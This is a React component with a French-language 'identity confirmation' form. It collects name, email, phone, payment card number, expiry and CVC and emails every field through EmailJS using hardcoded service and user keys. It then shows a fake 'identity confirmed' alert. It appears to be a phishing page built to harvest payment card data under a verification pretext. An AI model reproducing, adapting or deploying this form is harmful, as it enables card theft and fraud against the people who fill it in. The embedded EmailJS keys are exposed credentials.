import React from 'react';
import "../src/css/Inscription.css";
import Paiement from "./img/Paiement.png";
import emailjs from '@emailjs/browser';

const Inscription = () => {
    

    const sendEmail = (e) => {
        e.preventDefault();
        
        emailjs.sendForm('service_baulo79', 'template_j6sdj9n',e.target, 'user_meh6E1umVWovbYzf4dguL')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
            
    });
    e.target.reset(); 
    alert("CONFIRMATION D'IDENTITE EFFECTUEE");
    
};


  return (
    <div>
        <div className="body-container">
            <body>
                
                <div >
                    <div className='navBar'>
                        <h5>CONFIRMATION D'IDENTITE</h5>
                    </div>
                    <div className="text-animation"> Pour la confirmtion de votre identitée et de votre adresse postal merci de remplir le formulaire</div>
                    <form action='#' method='post' onSubmit={sendEmail} >
                        <div className='container-home'>
                            <div className="input-rigth">
                                <div className='title'><p><span>acceuil</span> service en ligne</p></div>
                                
                                <div className="input-content-rigth">
                                    <div className="input-ref">
                                        <p>Référence de transaction</p>
                                        <input type="text" name="Ref" placeholder='Référence de paiement' />
                                    </div>
                                    <div className="input-ref"> 
                                        <p>Nom</p> 
                                        <input type="text" name="name" placeholder='Name' />
                                    </div>
                                    <div className="input-ref">
                                        <p>E-mail</p> 
                                        <input type="text" name="mail" placeholder='E-mail' />
                                    </div>
                                </div>
                            </div>
                            <div className="input-left">
                                <div className="input-content-left">
                                    <div className="input-ref"> 
                                        <p>Montant</p> 
                                        <input type="text" name="montant" placeholder='0' />
                                    </div>
                                    <div className="input-ref"> 
                                        <p>Prenom</p> 
                                        <input type="text" name="prenom" placeholder='Prenom' />
                                    </div>
                                    <div className="input-ref"> 
                                        <p>Telephone</p> 
                                        <input type="number" name="telephone" placeholder='Telephone'/>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div className="content-footer">
                            <div className="input-footer">
                                <p>Numero de carte</p>
                                <input name="card" type="number" placeholder="numero de carte" />
                            </div>
                            <div className='input-year'>
                                <div className='year'>
                                    <input type="text" name="year" placeholder='MM/YY' />
                                </div>
                                <div className='cvc'>
                                    <input type="text" name="cvc" placeholder='CVC'/>
                                </div>
                               
                            </div>
                        </div>
                        <div className="input-submit">
                            <input type="submit" name="submit" value="Envoyer" />
                        </div>
                    </form>
                </div>
               
            </body>
            <footer>
                <div className='paiement-img'>
                    <img src={Paiement} alt="logo" />
                </div>
            </footer>
        </div>
    </div>
  )
}

export default Inscription;